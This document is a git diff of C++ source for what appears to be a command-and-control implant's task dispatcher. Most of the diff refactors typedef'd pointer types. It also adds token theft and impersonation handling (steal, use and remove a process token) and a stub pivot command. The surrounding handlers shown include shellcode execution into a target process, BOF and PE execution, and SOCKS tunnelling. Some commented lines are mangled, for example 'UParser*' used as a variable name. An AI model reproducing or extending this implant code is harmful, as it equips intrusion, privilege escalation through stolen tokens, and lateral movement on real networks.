@@ -6,9 +6,9 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
     KhDbg("[====== Starting Dispatcher ======]");
     KhDbg("Initial heap allocation count: %d", Self->Hp->Count);
 
-    PPACKAGE Package  = nullptr;
-    PPARSER  Parser   = nullptr;
-    PPACKAGE PostJobs = nullptr;
+    PACKAGE* Package  = nullptr;
+    PARSER*  Parser   = nullptr;
+    PACKAGE* PostJobs = nullptr;
     PVOID    DataPsr  = nullptr;
     UINT64   PsrLen   = 0;
     PCHAR    TaskUUID = nullptr;
@@ -21,7 +21,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
         goto CLEANUP;
     }
 
-    Parser = (PPARSER)Self->Hp->Alloc( sizeof(PARSER) );
+    Parser = (PARSER*)Self->Hp->Alloc( sizeof(PARSER) );
     if ( !Parser ) {
         KhDbg("ERROR: Failed to allocate parser memory");
         goto CLEANUP;
@@ -70,7 +70,7 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
                     Parser, Parser->Buffer, Parser->Length
                 );
 
-                PJOBS NewJob = Self->Jbs->Create( TaskUUID, Parser );
+                JOBS* NewJob = Self->Jbs->Create( TaskUUID, Parser );
                 if (!NewJob) {
                     KhDbg("WARNING: Failed to create job for task %d", i);
                     continue;
@@ -106,10 +106,10 @@ CLEANUP:
 }
 
 auto DECLFN Task::ExecPE(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     ULONG BuffLen = 0;
     ULONG ArgLen  = 0;
@@ -123,12 +123,12 @@ auto DECLFN Task::ExecPE(
 }
 
 auto DECLFN Task::ExecBof(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     BOOL Success = FALSE;
 
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     G_PACKAGE = Package;
     G_PARSER  = Parser;
@@ -155,10 +155,10 @@ auto DECLFN Task::ExecBof(
 }
 
 auto DECLFN Task::ExecSc(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     ULONG ProcID  = Self->Psr->Int32( Parser );
     ULONG BuffLen = 0;
@@ -175,17 +175,17 @@ auto DECLFN Task::ExecSc(
 }
 
 auto DECLFN Task::Download(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
 }
 
 auto DECLFN Task::Upload(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     Job->State = KH_JOB_RUNNING;
 
-//     PPACKAGE Package  = NULL;
-//     PPARSER  UpParser = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
+//     PACKAGE* Package  = NULL;
+//     PARSER*  UParser* = (PARSER*)Self->Hp->Alloc( sizeof( PARSER ) );
 //     BOOL     Success  = FALSE;    
 
 //     ULONG  UUIDLen = 0;
@@ -228,10 +228,10 @@ auto DECLFN Task::Upload(
 
 //         Self->Pkg->Transmit( Package, &Data, &Length );
 //         KhDbg( "receiving..." )
-//         Self->Psr->New( UpParser, Data, Length );
+//         Self->Psr->New( UParser*, Data, Length );
     
 //         KhDbg( "receiving..." )
-//         Success = Self->Psr->Int32( UpParser );
+//         Success = Self->Psr->Int32( UParser* );
 //         if ( !Success ) {
 //             KhDbg( "received fail in the chunk: %d", Self->Tsp->Tf.Up.CurChunk );
 //         }
@@ -240,18 +240,18 @@ auto DECLFN Task::Upload(
     
 //         KhDbg( "receiving..." )
 
-//         Self->Tsp->Tf.Up.FileID      = Self->Psr->Str( UpParser, &Self->Pkg->UUIDl );
+//         Self->Tsp->Tf.Up.FileID      = Self->Psr->Str( UParser*, &Self->Pkg->UUIDl );
 //         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
-//         Self->Tsp->Tf.Up.TotalChunks = Self->Psr->Int32( UpParser );
+//         Self->Tsp->Tf.Up.TotalChunks = Self->Psr->Int32( UParser* );
 //         KhDbg( "receiving..." )
-//         Self->Tsp->Tf.Up.CurChunk    = Self->Psr->Int32( UpParser );
+//         Self->Tsp->Tf.Up.CurChunk    = Self->Psr->Int32( UParser* );
     
 //         KhDbg( "receiving..." )
 //         KhDbg( "current chunk: %d", Self->Tsp->Tf.Up.CurChunk );
 //         KhDbg( "file id      : %s", Self->Tsp->Tf.Up.FileID );
 //         KhDbg( "path         : %s", Self->Tsp->Tf.Up.Path );
 
-//         TmpBuffer = Self->Psr->Bytes( UpParser, &TmpLength );
+//         TmpBuffer = Self->Psr->Bytes( UParser*, &TmpLength );
 //         if ( !FileBuffer ) {
 //             KhDbg( "fail to get chunk file data" );
 //         }
@@ -271,7 +271,7 @@ auto DECLFN Task::Upload(
 
 //         KhDbg( "received [%d bytes] at %p", FileBuffer, FileLength );
 
-//         Self->Psr->Destroy( UpParser );
+//         Self->Psr->Destroy( UParser* );
 
 //         KhDbg(  )
 
@@ -295,16 +295,16 @@ auto DECLFN Task::Upload(
 // _KH_END:
 //     if ( FileBuffer ) Self->Hp->Free( FileBuffer, FileLength );
 //     if ( Package    ) Self->Pkg->Destroy( Package  );
-//     if ( UpParser   ) Self->Psr->Destroy( UpParser );
+//     if ( UParser*   ) Self->Psr->Destroy( UParser* );
 
 //     return KhGetError;
 }
 
 auto DECLFN Task::FileSystem(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     UINT8    SbCommandID  = Self->Psr->Byte( Parser );
 
@@ -452,11 +452,36 @@ _KH_END:
     return KhRetSuccess;
 }
 
-auto DECLFN Task::Dotnet(
-    _In_ PJOBS Job
+auto DECLFN Task::Pivot(
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
+
+    UINT8 SubCmd = Self->Psr->Byte( Parser );
+
+    KhDbg( "sub command id: %d", SubCmd );
+
+    Self->Pkg->Byte( Package, SubCmd );    
+
+    switch ( SubCmd ) {
+        case PvtList: {
+
+        }
+        case PvtLink: {
+
+        }
+        case PvtUnlink: {
+
+        }
+    }
+}
+
+auto DECLFN Task::Dotnet(
+    _In_ JOBS* Job
+) -> ERROR_CODE {
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     UINT8      SbCommandID = Self->Psr->Byte( Parser );
     ERROR_CODE Code = ERROR_SUCCESS;
@@ -525,12 +550,12 @@ _KH_END:
 unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);
 
 auto DECLFN Task::Socks(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     KhDbg("Starting SOCKS task processing");
     
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     BOOL  IsExit    = Self->Psr->Int32(Parser);
     ULONG ServerID  = Self->Psr->Int32(Parser);
@@ -918,13 +943,13 @@ auto DECLFN Task::Socks(
     return Result;
 }
 
-// auto DECLFN Task::Socks(_In_ PJOBS Job) -> ERROR_CODE {
+// auto DECLFN Task::Socks(_In_ JOBS* Job) -> ERROR_CODE {
 //     KhDbg("SOCKS5: Starting processing (Job: %p)", Job);
 
 //     Self->Sckt->InitWSA();
 
-//     PPACKAGE Package = Job->Pkg;
-//     PPARSER  Parser  = Job->Psr;
+//     PACKAGE* Package = Job->Pkg;
+//     PARSER*  Parser  = Job->Psr;
 
 //     BOOL  IsExit    = Self->Psr->Int32( Parser );
 //     ULONG ServerID  = Self->Psr->Int32( Parser );
@@ -1181,53 +1206,11 @@ auto DECLFN Task::Socks(
 //     return Result;
 // }
 
-auto DECLFN Task::Info(
-    _In_ PJOBS Job
-) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-
-    Self->Pkg->Str( Package, Self->Session.AgentID     );
-    Self->Pkg->Int64(  Package, Self->Session.Base.Start  );
-    Self->Pkg->Int32(  Package, Self->Session.Base.Length );
-    Self->Pkg->Str( Package, Self->Session.ImagePath   );
-    Self->Pkg->Str( Package, Self->Session.CommandLine );
-    Self->Pkg->Int32(  Package, Self->Session.ProcessID   );
-    Self->Pkg->Int32(  Package, Self->Session.ThreadID    );
-    Self->Pkg->Int32(  Package, Self->Session.ParentID    );
-    Self->Pkg->Int32(  Package, Self->Session.HeapHandle  );
-    Self->Pkg->Int32(  Package, Self->Session.SleepTime   );
-    Self->Pkg->Int32(  Package, Self->Session.ProcessArch );
-    Self->Pkg->Byte(   Package, Self->Session.Elevated    );
-
-    Self->Pkg->Byte(   Package, Self->Mk->Ctx.TechniqueID      );
-    Self->Pkg->Byte(   Package, Self->Mk->Ctx.Heap             );
-    Self->Pkg->Int64(  Package, Self->Mk->Ctx.JmpGadget        );
-    Self->Pkg->Int64(  Package, Self->Mk->Ctx.NtContinueGadget );
-
-    Self->Pkg->Str( Package, Self->Machine.UserName      );
-    Self->Pkg->Str( Package, Self->Machine.CompName      );
-    Self->Pkg->Str( Package, Self->Machine.DomName       );
-    Self->Pkg->Str( Package, Self->Machine.NetBios       );
-    Self->Pkg->Int32(  Package, Self->Machine.OsArch        );
-    Self->Pkg->Int32(  Package, Self->Machine.OsMjrV        );
-    Self->Pkg->Int32(  Package, Self->Machine.OsMnrV        );
-    Self->Pkg->Int32(  Package, Self->Machine.OsBuild       );
-    Self->Pkg->Int32(  Package, Self->Machine.ProductType   );
-    Self->Pkg->Int32(  Package, Self->Machine.TotalRAM      );
-    Self->Pkg->Int32(  Package, Self->Machine.AvalRAM       );
-    Self->Pkg->Int32(  Package, Self->Machine.UsedRAM       );
-    Self->Pkg->Int32(  Package, Self->Machine.PercentRAM    );
-    Self->Pkg->Str( Package, Self->Machine.ProcessorName );
-    Self->Pkg->Int32(  Package, Self->Machine.ProcessorsNbr );
-    
-    KhRetSuccess;
-}
-
 auto DECLFN Task::Config(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package = Job->Pkg;
-    PPARSER  Parser  = Job->Psr;
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
 
     INT32    ConfigCount = Self->Psr->Int32( Parser );
     ULONG    TmpVal      = 0;
@@ -1313,15 +1296,17 @@ auto DECLFN Task::Config(
 }
 
 auto DECLFN Task::Token(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     PACKAGE* Package = Job->Pkg;
     PARSER*  Parser  = Job->Psr;
 
-    INT32 SubID = Self->Psr->Int32( Parser );
+    UINT8 SubID = Self->Psr->Int32( Parser );
+
+    Self->Pkg->Byte( Package, SubID );
 
     switch ( SubID ) {
-        case TknGetUUID: {
+        case TknGetUID: {
             CHAR*  ProcUser    = nullptr;
             HANDLE TokenHandle = nullptr;
 
@@ -1338,16 +1323,54 @@ auto DECLFN Task::Token(
             break;
         }
         case TknSteal: {
+            ULONG ProcessID = Self->Psr->Int32( Parser );
+            BOOL  Success   = FALSE;
+
+            TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );
+
+            if ( ! Token ) {
+                Self->Pkg->Int32( Package, FALSE ); break;
+            }
+
+            if ( ! Self->Tkn->Use( Token->Handle ) ) {
+                Self->Pkg->Int32( Package, FALSE ); break;
+            }
+
+            Self->Pkg->Int32( Package, TRUE );
+
+            Self->Pkg->Int32( Package, Token->TokenID );
+            Self->Pkg->Int32( Package, Token->ProcessID );
+            Self->Pkg->Str( Package, Token->User );
+            Self->Pkg->Str( Package, Token->Host );
+            Self->Pkg->Int64( Package, (INT64)Token->Handle );
+
             break;
         }
+        case TknUse: {
+            HANDLE Token = (HANDLE)Self->Psr->Int32( Parser );
+            Self->Pkg->Int32( Package, Self->Tkn->Use( Token ) );
+            break;
+        }
+        case TknRm: {
+            ULONG TokenID = Self->Psr->Int32( Parser );
+            Self->Pkg->Int32( Package, Self->Tkn->Rm( TokenID ) );  
+            break;
+        }
+        case TknMake: {
+
+        }
     }
+
+    Self->Pkg->Transmit( Package, 0, 0 );
+
+    return KhGetError;
 }
 
 auto DECLFN Task::Process(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
-    PPACKAGE Package     = Job->Pkg;
-    PPARSER  Parser      = Job->Psr;
+    PACKAGE* Package     = Job->Pkg;
+    PARSER*  Parser      = Job->Psr;
     UINT8    SbCommandID = Self->Psr->Byte( Parser );
     ULONG    TmpVal      = 0;
     BOOL     Success     = FALSE;
@@ -1488,7 +1511,7 @@ auto DECLFN Task::Process(
 }
 
 auto DECLFN Task::Exit(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     INT8 ExitType = Self->Psr->Byte( Job->Psr );
 
